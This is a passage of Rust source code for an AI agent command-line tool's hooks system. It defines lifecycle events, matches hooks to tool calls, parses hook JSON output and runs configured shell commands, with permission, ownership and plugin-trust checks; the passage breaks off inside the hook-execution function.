//! Hooks system — event-driven command execution.
//!
//! Hooks are configured in ~/.agiworkforce/hooks.json and run shell commands
//! in response to lifecycle events (SessionStart, Stop, AfterToolUse).
//!
//! Hooks can optionally include a `matcher` regex — the hook only fires when
//! the matcher matches the event name **or** the `tool_name` from the input.
//!
//! Hook stdout is parsed as JSON to allow control-flow decisions:
//! - `{"decision": "block", "reason": "..."}` → blocks the action
//! - `{"continue": false}` → signals the caller to stop

use anyhow::{Context, Result};
// Only used inside the #[cfg(unix)] permission-check block at the bottom of
// load_hooks_config() — gating the import keeps `unused = "deny"` on windows.
#[cfg(unix)]
use colored::Colorize;
use regex::Regex;
use serde::{Deserialize, Deserializer, Serialize};
use std::collections::{HashMap, HashSet};
use std::sync::{Mutex, OnceLock};
use std::time::Duration;
use tokio::process::Command;

// ---------------------------------------------------------------------------
// Configuration types
// ---------------------------------------------------------------------------

/// A configured hook.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Hook {
    /// Shell command to execute.
    pub command: String,

    /// Optional arguments.
    #[serde(default)]
    pub args: Vec<String>,

    /// Timeout in seconds (default: 10).
    #[serde(default = "default_timeout")]
    pub timeout: u64,

    /// Whether to block on this hook (default: true).
    #[serde(default = "default_blocking")]
    pub blocking: bool,

    /// Optional regex matcher — hook only runs if matcher matches the event
    /// name or the `tool_name` from the input payload.
    #[serde(default)]
    pub matcher: Option<String>,

    /// Optional permission-rule-style filter (e.g. `Bash(git *)`, `Edit(*.rs)`).
    /// Hook only fires when the tool call matches this pattern.
    /// Format: `ToolName(arg-glob)`. ToolName matches `tool_name`; the
    /// arg-glob is matched against the first string-valued tool argument
    /// (typically `command`/`path`) using shell-style `*` and `?` wildcards.
    /// `if:` and `matcher` are AND-ed when both are set.
    #[serde(default, rename = "if")]
    pub if_condition: Option<String>,
}

fn default_timeout() -> u64 {
    10
}
fn default_blocking() -> bool {
    true
}

/// Hook events — canonical names match Claude Code's 19-event vocabulary
/// for free interop with `~/.claude/hooks.json` configs. Old AGI-specific
/// names (`BeforeToolUse`, `PreEdit`, …) still load via custom Deserialize
/// with a one-time stderr deprecation warning per alias per session.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize)]
pub enum HookEvent {
    SessionStart,
    SessionEnd,
    /// Fires before any tool call. Replaces the legacy `BeforeToolUse`,
    /// `PreEdit`, `PreCommand` events — use the `if:` field on the hook to
    /// filter to a specific tool (e.g. `if: "Bash(git *)"`).
    PreToolUse,
    /// Fires after any tool call completes. Replaces `AfterToolUse`,
    /// `PostEdit`, `PostCommand`.
    PostToolUse,
    /// Fires when the user submits a prompt. Renamed from `BeforeMessage`
    /// to match Claude Code vocabulary.
    UserPromptSubmit,
    /// AGI-specific: fires after the assistant produces a message. No
    /// equivalent in Claude Code; kept as-is.
    AfterMessage,
    /// AGI-specific: fires when the agent enters/exits plan mode.
    PlanModeChanged,
    /// Fires before context compaction starts. Paired with `PostCompact`.
    PreCompact,
    /// Fires after context compaction completes. Renamed from
    /// `ContextCompacted` to match Claude Code vocabulary.
    PostCompact,
    /// Fires before model resolution / first LLM call of a turn. Hook may
    /// override the model via `{"model": "..."}` (e.g., to swap to a
    /// fallback before the request even leaves the agent). Adapted from
    /// OpenClaw's `before_model_resolve`.
    BeforeModelResolve,
    /// Fires after session load and before the prompt is finalized for the
    /// LLM. Hook may inject extra context via `{"additional_context": "..."}`.
    /// Adapted from OpenClaw's `before_prompt_build`.
    BeforePromptBuild,
    /// Fires after a tool returns and before its output is appended to the
    /// transcript. Hook may rewrite the output via
    /// `{"updated_mcp_tool_output": "..."}` (PII redaction, secret scrubbing,
    /// truncation). Distinct from `PostToolUse` — runs *closer* to persistence
    /// and is the right place for storage-affecting transforms. Adapted from
    /// OpenClaw's `tool_result_persist`.
    ToolResultPersist,
    /// Fires when a subagent starts. Renamed from `SubagentSpawned`.
    SubagentStart,
    /// Fires when a subagent stops. Renamed from `SubagentCompleted`.
    SubagentStop,
    /// Fires before a permission prompt is shown to the user. New in B5;
    /// matches Claude Code's `PermissionRequest` event.
    PermissionRequest,
    /// Fires on notification events (warnings, errors shown to user).
    Notification,
    /// Fires when the user stops the agentic loop (Ctrl-C or loop detection).
    Stop,
    /// AGI-specific: fires when a cron trigger fires in daemon mode.
    CronTriggered,
    /// AGI-specific: fires when a webhook trigger is received in daemon mode.
    WebhookReceived,
    /// Fires when a watched file changes in daemon mode.
    FileChanged,
    /// AGI-specific: fires when the daemon process starts.
    DaemonStarted,
    /// AGI-specific: fires when the daemon process stops.
    DaemonStopped,
}

impl std::fmt::Display for HookEvent {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::SessionStart => write!(f, "SessionStart"),
            Self::SessionEnd => write!(f, "SessionEnd"),
            Self::PreToolUse => write!(f, "PreToolUse"),
            Self::PostToolUse => write!(f, "PostToolUse"),
            Self::UserPromptSubmit => write!(f, "UserPromptSubmit"),
            Self::AfterMessage => write!(f, "AfterMessage"),
            Self::PlanModeChanged => write!(f, "PlanModeChanged"),
            Self::PreCompact => write!(f, "PreCompact"),
            Self::PostCompact => write!(f, "PostCompact"),
            Self::BeforeModelResolve => write!(f, "BeforeModelResolve"),
            Self::BeforePromptBuild => write!(f, "BeforePromptBuild"),
            Self::ToolResultPersist => write!(f, "ToolResultPersist"),
            Self::SubagentStart => write!(f, "SubagentStart"),
            Self::SubagentStop => write!(f, "SubagentStop"),
            Self::PermissionRequest => write!(f, "PermissionRequest"),
            Self::Notification => write!(f, "Notification"),
            Self::Stop => write!(f, "Stop"),
            Self::CronTriggered => write!(f, "CronTriggered"),
            Self::WebhookReceived => write!(f, "WebhookReceived"),
            Self::FileChanged => write!(f, "FileChanged"),
            Self::DaemonStarted => write!(f, "DaemonStarted"),
            Self::DaemonStopped => write!(f, "DaemonStopped"),
        }
    }
}

/// Tracks which deprecated event aliases have already emitted a stderr
/// warning this session. Keyed by old alias name. Once an alias has been
/// warned about, subsequent loads in the same process stay silent.
fn deprecation_seen() -> &'static Mutex<HashSet<String>> {
    static SEEN: OnceLock<Mutex<HashSet<String>>> = OnceLock::new();
    SEEN.get_or_init(|| Mutex::new(HashSet::new()))
}

/// Resolve an event name string (canonical or legacy alias) to its
/// canonical `HookEvent`. Emits a one-time stderr deprecation warning the
/// first time a given legacy alias is seen this session.
fn resolve_event_name(name: &str) -> Option<HookEvent> {
    // Canonical names — no warning, no alias table.
    let canonical = match name {
        "SessionStart" => Some(HookEvent::SessionStart),
        "SessionEnd" => Some(HookEvent::SessionEnd),
        "PreToolUse" => Some(HookEvent::PreToolUse),
        "PostToolUse" => Some(HookEvent::PostToolUse),
        "UserPromptSubmit" => Some(HookEvent::UserPromptSubmit),
        "AfterMessage" => Some(HookEvent::AfterMessage),
        "PlanModeChanged" => Some(HookEvent::PlanModeChanged),
        "PreCompact" => Some(HookEvent::PreCompact),
        "PostCompact" => Some(HookEvent::PostCompact),
        "BeforeModelResolve" => Some(HookEvent::BeforeModelResolve),
        "BeforePromptBuild" => Some(HookEvent::BeforePromptBuild),
        "ToolResultPersist" => Some(HookEvent::ToolResultPersist),
        "SubagentStart" => Some(HookEvent::SubagentStart),
        "SubagentStop" => Some(HookEvent::SubagentStop),
        "PermissionRequest" => Some(HookEvent::PermissionRequest),
        "Notification" => Some(HookEvent::Notification),
        "Stop" => Some(HookEvent::Stop),
        "CronTriggered" => Some(HookEvent::CronTriggered),
        "WebhookReceived" => Some(HookEvent::WebhookReceived),
        "FileChanged" => Some(HookEvent::FileChanged),
        "DaemonStarted" => Some(HookEvent::DaemonStarted),
        "DaemonStopped" => Some(HookEvent::DaemonStopped),
        _ => None,
    };
    if let Some(event) = canonical {
        return Some(event);
    }

    // Legacy aliases — resolve + warn once per session per alias.
    let (event, hint): (HookEvent, &'static str) = match name {
        "BeforeToolUse" => (HookEvent::PreToolUse, ""),
        "AfterToolUse" => (HookEvent::PostToolUse, ""),
        "BeforeMessage" => (HookEvent::UserPromptSubmit, ""),
        "PreEdit" => (
            HookEvent::PreToolUse,
            " — use `if: \"Edit(*)\"` to filter to edit tools",
        ),
        "PostEdit" => (
            HookEvent::PostToolUse,
            " — use `if: \"Edit(*)\"` to filter to edit tools",
        ),
        "PreCommand" => (
            HookEvent::PreToolUse,
            " — use `if: \"Bash(*)\"` to filter to shell commands",
        ),
        "PostCommand" => (
            HookEvent::PostToolUse,
            " — use `if: \"Bash(*)\"` to filter to shell commands",
        ),
        "ContextCompacted" => (HookEvent::PostCompact, ""),
        "SubagentSpawned" => (HookEvent::SubagentStart, ""),
        "SubagentCompleted" => (HookEvent::SubagentStop, ""),
        _ => return None,
    };

    if let Ok(mut seen) = deprecation_seen().lock() {
        if seen.insert(name.to_string()) {
            eprintln!(
                "warning: hook event \"{}\" is deprecated; use \"{}\" instead{}. \
                 (this warning shows once per session)",
                name, event, hint
            );
        }
    }
    Some(event)
}

impl<'de> Deserialize<'de> for HookEvent {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: Deserializer<'de>,
    {
        let name = String::deserialize(deserializer)?;
        resolve_event_name(&name).ok_or_else(|| {
            serde::de::Error::custom(format!(
                "unknown hook event \"{}\". Canonical events: SessionStart, SessionEnd, \
                 PreToolUse, PostToolUse, UserPromptSubmit, AfterMessage, PlanModeChanged, \
                 PreCompact, PostCompact, SubagentStart, SubagentStop, PermissionRequest, \
                 Notification, Stop, CronTriggered, WebhookReceived, FileChanged, \
                 DaemonStarted, DaemonStopped. Legacy aliases (deprecated): BeforeToolUse, \
                 AfterToolUse, BeforeMessage, PreEdit, PostEdit, PreCommand, PostCommand, \
                 ContextCompacted, SubagentSpawned, SubagentCompleted.",
                name
            ))
        })
    }
}

/// Parse a permission-rule pattern of the form `ToolName(arg-glob)` and
/// test whether the given `tool_name` and tool args match.
///
/// Examples: `Bash(git *)`, `Edit(*.rs)`, `WebFetch(*)`.
///
/// The arg-glob uses shell-style `*` (any chars) and `?` (one char) and is
/// anchored — the entire arg must match. The arg-glob is tested against the
/// first string-valued field of `tool_args` (or against an empty string if
/// `tool_args` is absent / has no string field).
fn matches_permission_rule(rule: &str, tool_name: &str, tool_args: Option<&serde_json::Value>) -> bool {
    // Find the opening paren that begins the arg-glob.
    let open = match rule.find('(') {
        Some(i) => i,
        None => return false,
    };
    if !rule.ends_with(')') {
        return false;
    }
    let rule_tool = rule[..open].trim();
    let arg_glob = &rule[open + 1..rule.len() - 1];

    // Tool name must match exactly (case-sensitive, like Claude Code).
    if rule_tool != tool_name {
        return false;
    }

    // Find the first string arg to glob-match. Common keys for Bash =>
    // `command`; for Edit/Read => `path`/`file_path`; otherwise the first
    // string-valued field in iteration order.
    let arg_value: String = tool_args
        .and_then(|v| v.as_object())
        .and_then(|obj| {
            obj.get("command")
                .or_else(|| obj.get("path"))
                .or_else(|| obj.get("file_path"))
                .or_else(|| obj.values().find(|v| v.is_string()))
                .and_then(|v| v.as_str())
                .map(String::from)
        })
        .unwrap_or_default();

    glob_match(arg_glob, &arg_value)
}

/// Tiny shell-style glob matcher: `*` matches any (possibly empty) run of
/// characters, `?` matches exactly one character, all other chars match
/// literally. Anchored — the entire input must match.
fn glob_match(pattern: &str, input: &str) -> bool {
    let p: Vec<char> = pattern.chars().collect();
    let s: Vec<char> = input.chars().collect();
    // Iterative two-pointer with backtracking on `*`.
    let (mut pi, mut si) = (0usize, 0usize);
    let (mut star_p, mut star_s): (Option<usize>, usize) = (None, 0);
    while si < s.len() {
        if pi < p.len() && (p[pi] == '?' || p[pi] == s[si]) {
            pi += 1;
            si += 1;
        } else if pi < p.len() && p[pi] == '*' {
            star_p = Some(pi);
            star_s = si;
            pi += 1;
        } else if let Some(sp) = star_p {
            pi = sp + 1;
            star_s += 1;
            si = star_s;
        } else {
            return false;
        }
    }
    while pi < p.len() && p[pi] == '*' {
        pi += 1;
    }
    pi == p.len()
}

/// Hooks configuration loaded from hooks.json.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct HooksConfig {
    #[serde(default)]
    pub hooks: HashMap<String, Vec<Hook>>, // event name -> hooks
}

// ---------------------------------------------------------------------------
// Trigger configuration types (for daemon mode)
// ---------------------------------------------------------------------------

/// Type of event trigger for daemon mode.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum TriggerType {
    Cron,
    Webhook,
    FileWatcher,
}

/// A single trigger definition loaded from triggers.json.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TriggerConfig {
    /// Unique identifier for this trigger.
    pub id: String,

    /// The type of trigger (cron, webhook, or file_watcher).
    #[serde(rename = "type")]
    pub trigger_type: TriggerType,

    /// Prompt to send to the agent when this trigger fires.
    #[serde(default)]
    pub prompt: Option<String>,

    /// Model to use for agent execution (e.g. "auto-balanced", "claude-opus-4-6").
    #[serde(default)]
    pub model: Option<String>,

    /// Whether this trigger is enabled (default: true).
    #[serde(default = "default_enabled")]
    pub enabled: bool,

    /// Cron expression (for cron triggers only, e.g. "0 9 * * *").
    #[serde(default)]
    pub cron: Option<String>,

    /// HTTP path suffix for webhook triggers (e.g. "/deploy").
    #[serde(default)]
    pub webhook_path: Option<String>,

    /// Directory path to watch (for file_watcher triggers).
    #[serde(default)]
    pub watch_path: Option<String>,

    /// Glob pattern to filter watched files (for file_watcher triggers).
    #[serde(default)]
    pub watch_glob: Option<String>,
}

fn default_enabled() -> bool {
    true
}

/// Top-level triggers configuration loaded from triggers.json.
#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct TriggersConfig {
    #[serde(default)]
    pub triggers: Vec<TriggerConfig>,

    /// Port for the webhook HTTP server (default: 7891).
    #[serde(default = "default_webhook_port")]
    pub webhook_port: u16,

    /// Bearer token for webhook authentication.
    ///
    /// HIGH-3: This field is REQUIRED when any webhook triggers are configured.
    /// The daemon will refuse to start without a token of at least 32 characters.
    /// Setting this to None means no token is configured — the token validation
    /// in `run_daemon` will reject this before the server starts.
    #[serde(default)]
    pub webhook_token: Option<String>,

    /// Maximum number of concurrent trigger executions (default: 4).
    #[serde(default = "default_max_parallel")]
    pub max_parallel: usize,
}

fn default_webhook_port() -> u16 {
    7891
}

fn default_max_parallel() -> usize {
    4
}

/// Load triggers configuration from ~/.agiworkforce/triggers.json.
pub fn load_triggers() -> Result<Option<TriggersConfig>> {
    let path = crate::config::CliConfig::config_dir()?.join("triggers.json");

    if !path.exists() {
        return Ok(None);
    }

    let contents = std::fs::read_to_string(&path).context("Failed to read triggers.json")?;

    let config: TriggersConfig =
        serde_json::from_str(&contents).context("Failed to parse triggers.json")?;

    Ok(Some(config))
}

// ---------------------------------------------------------------------------
// Structured tool execution payload
// ---------------------------------------------------------------------------

/// Rich payload describing a tool execution, passed to hooks via `HookInput`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ToolExecutionPayload {
    /// Name of the tool that was executed.
    pub tool_name: String,
    /// Kind of tool: `"builtin"`, `"mcp"`, or `"custom"`.
    pub tool_kind: String,
    /// Whether the tool was actually executed (may be skipped by guards).
    pub executed: bool,
    /// Whether execution succeeded.
    pub success: bool,
    /// Wall-clock duration of the tool execution in milliseconds.
    pub duration_ms: u64,
}

// ---------------------------------------------------------------------------
// Hook input/output (JSON protocol)
// ---------------------------------------------------------------------------

/// Data passed to hooks via stdin (JSON).
#[derive(Debug, Serialize)]
pub struct HookInput {
    pub event: String,
    pub session_id: Option<String>,
    pub model: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub tool_name: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub tool_args: Option<serde_json::Value>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub tool_output: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub message: Option<String>,
    /// Structured tool execution payload (populated for AfterToolUse).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub tool_execution: Option<ToolExecutionPayload>,
}

/// Result from running a single hook.
/// Fields are populated by run_hooks and consumed by aggregate_results for control flow.
#[derive(Debug, Default)]
#[allow(dead_code)]
pub struct HookResult {
    pub hook_command: String,
    pub success: bool,
    pub stdout: String,
    pub stderr: String,
    pub duration_ms: u64,
    /// `true` if the hook's JSON output contained `{"decision": "block", ...}`.
    pub blocked: bool,
    /// Reason string when `blocked` is `true`.
    pub reason: Option<String>,
    /// `true` if the hook's JSON output contained `{"continue": false}`.
    pub should_stop: bool,
    /// Phase 10: hook returned `{"updated_input": {...}}` to rewrite the
    /// tool's arguments before execution. `None` if the hook didn't ask
    /// to mutate the input.
    pub updated_input: Option<serde_json::Value>,
    /// Phase 10: hook returned `{"additional_context": "..."}` to inject a
    /// system message into the conversation after the tool runs. Useful for
    /// "I redacted PII from this output" advisory messages.
    pub additional_context: Option<String>,
    /// Phase 10: hook returned `{"updated_mcp_tool_output": "..."}` to
    /// replace the tool's stdout before it's appended to the message
    /// history. Used for output sanitization / redaction.
    pub updated_mcp_tool_output: Option<String>,
}

// ---------------------------------------------------------------------------
// Hook result aggregation
// ---------------------------------------------------------------------------

/// Aggregate outcome across multiple hook results.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum HookAggregateOutcome {
    /// All hooks passed — proceed normally.
    Continue,
    /// At least one hook signalled `should_stop`.
    Stop,
    /// At least one hook blocked with reasons.
    Blocked { reasons: Vec<String> },
}

/// Aggregate a slice of hook results into a single outcome.
///
/// Priority: Blocked > Stop > Continue.
pub fn aggregate_results(results: &[HookResult]) -> HookAggregateOutcome {
    let mut blocked_reasons: Vec<String> = Vec::new();
    let mut any_stop = false;

    for r in results {
        if r.blocked {
            if let Some(reason) = &r.reason {
                blocked_reasons.push(reason.clone());
            } else {
                blocked_reasons.push(format!("blocked by hook: {}", r.hook_command));
            }
        }
        if r.should_stop {
            any_stop = true;
        }
    }

    if !blocked_reasons.is_empty() {
        HookAggregateOutcome::Blocked {
            reasons: blocked_reasons,
        }
    } else if any_stop {
        HookAggregateOutcome::Stop
    } else {
        HookAggregateOutcome::Continue
    }
}

// ---------------------------------------------------------------------------
// Hook loading
// ---------------------------------------------------------------------------

/// Load hooks configuration from ~/.agiworkforce/hooks.json, then merge
/// plugin-declared hooks on top.
///
/// Merge order (Sprint B6): user `~/.agiworkforce/hooks.json` first, then each
/// installed plugin's `hooks:` section appended after the user's hooks for
/// the same event. This means user hooks run first; plugin hooks run after.
/// Plugin authors who want a guaranteed pre-user position should use
/// `matcher`/`if_condition` to scope their hook narrowly.
///
/// Verifies file permissions on Unix (rejects group/other-readable files).
pub fn load_hooks() -> Result<HooksConfig> {
    let path = crate::config::CliConfig::config_dir()?.join("hooks.json");

    let mut config: HooksConfig = if !path.exists() {
        HooksConfig::default()
    } else {
        // Security: verify hooks.json permissions and ownership.
        //
        // CLI-NEW-011 hardening (2026-05-04 audit):
        //   1. Original check rejected mode `&0o022` (group/other-writable) but
        //      ignored `&0o044` (group/other-readable). hooks.json may contain
        //      sensitive command strings — paths, embedded tokens, project
        //      identifiers — so a readable file is still a leak.
        //   2. There was no ownership check at all. A symlink-replacement
        //      attack (drop a symlink at ~/.agiworkforce/hooks.json pointing
        //      to a different user's hooks.json) could trick this code into
        //      executing hooks defined by another user. We now refuse to load
        //      hooks.json when the file's owning UID does not match the
        //      current process UID.
        #[cfg(unix)]
        {
            use std::os::unix::fs::MetadataExt;
            use std::os::unix::fs::PermissionsExt;
            if let Ok(meta) = std::fs::metadata(&path) {
                let mode = meta.permissions().mode();
                if mode & 0o022 != 0 {
                    eprintln!(
                        "{} hooks.json is group/other-writable (mode {:o}). \
                         Fix with: chmod 600 {}",
                        "security warning:".red().bold(),
                        mode & 0o777,
                        path.display()
                    );
                }
                if mode & 0o044 != 0 {
                    eprintln!(
                        "{} hooks.json is group/other-readable (mode {:o}). \
                         Fix with: chmod 600 {}",
                        "security warning:".red().bold(),
                        mode & 0o777,
                        path.display()
                    );
                }
                let owner_uid = meta.uid();
                // Use nix's safe wrapper rather than a raw `extern "C"` block;
                // workspace lints reject unsafe code.
                let process_uid = nix::unistd::getuid().as_raw();
                if owner_uid != process_uid {
                    return Err(anyhow::anyhow!(
                        "Refusing to load hooks.json: owned by uid {} but \
                         current process is uid {}. Suspected symlink or \
                         permissions attack. Path: {}",
                        owner_uid,
                        process_uid,
                        path.display()
                    ));
                }
            }
        }

        let contents = std::fs::read_to_string(&path).context("Failed to read hooks.json")?;
        serde_json::from_str(&contents).context("Failed to parse hooks.json")?
    };

    merge_plugin_hooks(&mut config);
    Ok(config)
}

/// Sprint B6: merge plugin-declared hooks into the loaded HooksConfig.
///
/// HIGH-2 security gate: hooks from project-local plugins (cwd/.agiworkforce/plugins/)
/// are BLOCKED by default. Cloning a malicious repo must not result in arbitrary shell
/// command execution on every tool call. Only global plugins (~/.agiworkforce/plugins/)
/// may contribute hooks without additional trust opt-in.
///
/// Hooks from ~/.agiworkforce/hooks.json (user-owned, loaded separately) remain trusted.
fn merge_plugin_hooks(config: &mut HooksConfig) {
    let mut plugins_mgr = crate::plugins::PluginsManager::new();
    if plugins_mgr
        .load_all(std::env::current_dir().ok().as_deref())
        .is_err()
    {
        return;
    }
    // hook_configs() already filters out project-local plugins (from_project_dir=true).
    // Emit a warning if any project-local plugins declared hooks, so users know they
    // were blocked rather than silently ignored.
    for (event_name, _hook_values, from_project) in plugins_mgr.hook_configs_with_trust() {
        if from_project {
            eprintln!(
                "[plugins] security: hooks for event '{}' from a project-local plugin were blocked. \
                 Only plugins installed in ~/.agiworkforce/plugins/ may contribute hooks. \
                 See --trust-plugin to explicitly opt in.",
                event_name
            );
        }
    }
    for (event_name, hook_values) in plugins_mgr.hook_configs() {
        for value in hook_values {
            match serde_json::from_value::<Hook>(value.clone()) {
                Ok(hook) => {
                    config
                        .hooks
                        .entry(event_name.clone())
                        .or_default()
                        .push(hook);
                }
                Err(e) => {
                    eprintln!(
                        "[plugins] failed to load hook for event {}: {} (raw: {})",
                        event_name, e, value
                    );
                }
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Matcher logic
// ---------------------------------------------------------------------------

/// Check whether a hook's optional matcher regex + permission-rule `if:`
/// filter both pass for the given event context.
///
/// - If neither `matcher` nor `if_condition` is set, the hook always fires.
/// - If only `matcher` is set, the regex is tested against the event name
///   (e.g. "PostToolUse") and the input's `tool_name` (if present).
/// - If only `if_condition` is set, the permission rule (e.g. `Bash(git *)`)
///   is parsed and tested against `tool_name` + `tool_args`.
/// - If both are set, both must pass (AND).
///
/// Returns `true` if the hook should fire.
fn hook_matches(hook: &Hook, event_name: &str, input: &HookInput) -> bool {
    // Regex matcher gate.
    let matcher_ok = match &hook.matcher {
        None => true,
        Some(pattern) => match Regex::new(pattern) {
            Err(_) => return false, // invalid regex → skip hook entirely
            Ok(re) => {
                re.is_match(event_name)
                    || input
                        .tool_name
                        .as_deref()
                        .map(|t| re.is_match(t))
                        .unwrap_or(false)
            }
        },
    };
    if !matcher_ok {
        return false;
    }

    // Permission-rule `if:` gate.
    if let Some(rule) = &hook.if_condition {
        let tool_name = match input.tool_name.as_deref() {
            Some(t) => t,
            // No tool_name in the input — `if:` rules can't match (they're
            // tool-specific by design). Skip the hook.
            None => return false,
        };
        if !matches_permission_rule(rule, tool_name, input.tool_args.as_ref()) {
            return false;
        }
    }

    true
}

// ---------------------------------------------------------------------------
// JSON output parsing
// ---------------------------------------------------------------------------

/// Phase 10: parsed signals from hook stdout. Replaces the prior tuple
/// return so transformer fields can ride alongside control-flow signals.
#[derive(Debug, Default)]
struct HookOutputSignals {
    blocked: bool,
    reason: Option<String>,
    should_stop: bool,
    updated_input: Option<serde_json::Value>,
    additional_context: Option<String>,
    updated_mcp_tool_output: Option<String>,
}

/// Cap the size of `additional_context` injected into the conversation. A
/// runaway hook shouldn't be able to flood the message history.
const MAX_ADDITIONAL_CONTEXT_BYTES: usize = 4 * 1024;

/// Parse hook stdout as JSON to extract control-flow + transformer signals.
///
/// Recognised shapes (any subset can appear together):
/// - `{"decision": "block", "reason": "..."}` → blocked=true, reason
/// - `{"continue": false}` → should_stop=true
/// - `{"updated_input": {...}}` → rewrite tool args (BeforeToolUse only)
/// - `{"additional_context": "..."}` → inject system message (capped 4KB)
/// - `{"updated_mcp_tool_output": "..."}` → rewrite tool output
///
/// Any other output (including non-JSON) is ignored → all signals default.
fn parse_hook_output(stdout: &str) -> HookOutputSignals {
    let trimmed = stdout.trim();
    if trimmed.is_empty() {
        return HookOutputSignals::default();
    }

    let parsed: serde_json::Value = match serde_json::from_str(trimmed) {
        Ok(v) => v,
        Err(_) => return HookOutputSignals::default(),
    };

    let blocked = parsed
        .get("decision")
        .and_then(|v| v.as_str())
        .is_some_and(|d| d == "block");

    let reason = if blocked {
        parsed
            .get("reason")
            .and_then(|v| v.as_str())
            .map(String::from)
    } else {
        None
    };

    let should_stop = parsed
        .get("continue")
        .and_then(|v| v.as_bool())
        .is_some_and(|c| !c);

    // Phase 10: transformer fields. Each is optional and independently
    // applied. updated_input is taken verbatim; additional_context is
    // size-capped; updated_mcp_tool_output must be a string (not arbitrary
    // JSON) so the conversation history stays well-formed.
    let updated_input = parsed.get("updated_input").cloned().filter(|v| !v.is_null());

    let additional_context = parsed
        .get("additional_context")
        .and_then(|v| v.as_str())
        .map(|s| {
            if s.len() > MAX_ADDITIONAL_CONTEXT_BYTES {
                let mut truncated = s[..MAX_ADDITIONAL_CONTEXT_BYTES].to_string();
                truncated.push_str("\n[additional_context truncated]");
                truncated
            } else {
                s.to_string()
            }
        });

    let updated_mcp_tool_output = parsed
        .get("updated_mcp_tool_output")
        .and_then(|v| v.as_str())
        .map(String::from);

    HookOutputSignals {
        blocked,
        reason,
        should_stop,
        updated_input,
        additional_context,
        updated_mcp_tool_output,
    }
}

/// Phase 10: aggregated transformer signals after running multiple hooks.
/// Last-writer-wins for `updated_input` and `updated_mcp_tool_output`;
/// `additional_context` from all hooks is concatenated newline-separated.
#[derive(Debug, Default)]
pub struct HookTransformers {
    pub updated_input: Option<serde_json::Value>,
    pub additional_context: Option<String>,
    pub updated_mcp_tool_output: Option<String>,
}

/// HIGH-2: Write a security audit log entry when a hook rewrites tool arguments
/// via `updated_input`. The log goes to ~/.agiworkforce/security-audit.log.
///
/// Logs the hook command, original args, and the new args so operators can
/// review what was changed. Failure to write the log is non-fatal but printed
/// to stderr.
pub fn audit_log_updated_input(
    hook_command: &str,
    original_args: &serde_json::Value,
    new_args: &serde_json::Value,
) {
    let entry = format!(
        "[{}] updated_input rewrite by hook {:?}\n  original: {}\n  new:      {}\n",
        chrono::Local::now().format("%Y-%m-%dT%H:%M:%S%z"),
        hook_command,
        original_args,
        new_args,
    );
    // Emit at WARN level to stderr so interactive users always see it.
    eprintln!("[security] hook rewrote tool args:\n  hook:     {hook_command}\n  original: {original_args}\n  new:      {new_args}");

    // Append to the security audit log (best-effort).
    if let Ok(dir) = crate::config::CliConfig::config_dir() {
        let log_path = dir.join("security-audit.log");
        use std::io::Write;
        if let Ok(mut f) = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(&log_path)
        {
            let _ = f.write_all(entry.as_bytes());
        }
    }
}

/// Aggregate transformer fields across hook results. Caller decides how to
/// apply the result — typically:
///   - `updated_input` mutates the tool args before exec (BeforeToolUse)
///   - `updated_mcp_tool_output` replaces the tool result (AfterToolUse)
///   - `additional_context` is appended as a system message
///
/// HIGH-2: when `updated_input` is present in any hook result, the rewrite is
/// logged to stderr and ~/.agiworkforce/security-audit.log. This makes
/// hook-driven tool argument tampering visible to the user.
pub fn aggregate_transformers(results: &[HookResult]) -> HookTransformers {
    let mut t = HookTransformers::default();
    let mut ctx_chunks: Vec<&str> = Vec::new();
    for r in results {
        if let Some(new_input) = &r.updated_input {
            // SECURITY: log the rewrite before applying it so the user can audit.
            audit_log_updated_input(
                &r.hook_command,
                t.updated_input.as_ref().unwrap_or(&serde_json::Value::Null),
                new_input,
            );
            t.updated_input = Some(new_input.clone());
        }
        if let Some(out) = &r.updated_mcp_tool_output {
            t.updated_mcp_tool_output = Some(out.clone());
        }
        if let Some(ctx) = &r.additional_context {
            ctx_chunks.push(ctx.as_str());
        }
    }
    if !ctx_chunks.is_empty() {
        t.additional_context = Some(ctx_chunks.join("\n"));
    }
    t
}

// ---------------------------------------------------------------------------
// Hook execution
// ---------------------------------------------------------------------------

/// Run all hooks for a given event.
pub async fn run_hooks(
    config: &HooksConfig,
    event: HookEvent,
    input: &HookInput,
) -> Vec<HookResult> {
    let event_name = event.to_string();
    let hooks = match config.hooks.get(&event_name) {
        Some(h) => h,
        None => return Vec::new(),
    };

    let input_json = serde_json::to_string(input).unwrap_or_default();
    let mut results = Vec::new();

    for hook in hooks {
        // Check matcher before executing
        if !hook_matches(hook, &event_name, input) {
            continue;
        }

        let result = run_single_hook(hook, &input_json).await;
        let is_blocking = hook.blocking;
        results.push(result);

        // If a blocking hook failed, stop running subsequent hooks
        if is_blocking && !results.last().map(|r| r.success).unwrap_or(true) {
            break;
        }
    }

    results
}

/// Execute a single hook command.
async fn run_single_hook(hook: &Hook, input_json: &str) -> HookResult {
    let start = std::time::Instant::now();

    let mut cmd = Command::new("sh");
    cmd.arg("-c")
        .arg(&hook.command)
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());

    let timeout = Duration::from_secs(hook.timeout);

    let result = tokio::time::timeout(timeout, async {
        let mut child = cmd.spawn()?;

        // Write input JSON to stdin
        if let Some(mut stdin) = child.stdin.take() {
            use tokio::io::AsyncWriteExt;
            let _ = stdin.write_all(input_json.as_bytes()).await;
            drop(stdin);
        }

        child.wait_with_output().await
    })
    .await;

    let duration_ms = start.elapsed().as_millis() as u64;

    match result {
